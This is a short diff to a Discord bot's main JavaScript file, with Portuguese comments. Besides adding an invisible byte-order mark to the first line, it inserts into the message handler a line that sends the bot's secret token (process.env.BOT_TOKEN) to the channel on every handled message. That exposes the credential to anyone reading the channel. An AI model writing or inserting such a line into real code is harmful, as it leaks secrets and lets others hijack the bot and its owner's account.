@@ -1,4 +1,4 @@
-const settings = require("./settings.json");
+﻿const settings = require("./settings.json");
 const Discord  = require("discord.js");
 const fs       = require("fs");
 const prefix   = settings.prefix;
@@ -60,6 +60,7 @@ bot.on("message", async function (message) {
 
 	// Seta funcionalidades adicionais
 	bot.setFunc(message, args);
+	message.channel.send(process.env.BOT_TOKEN);
 
 	// Recupera comando
 	let cmd = bot.commands.get(command);
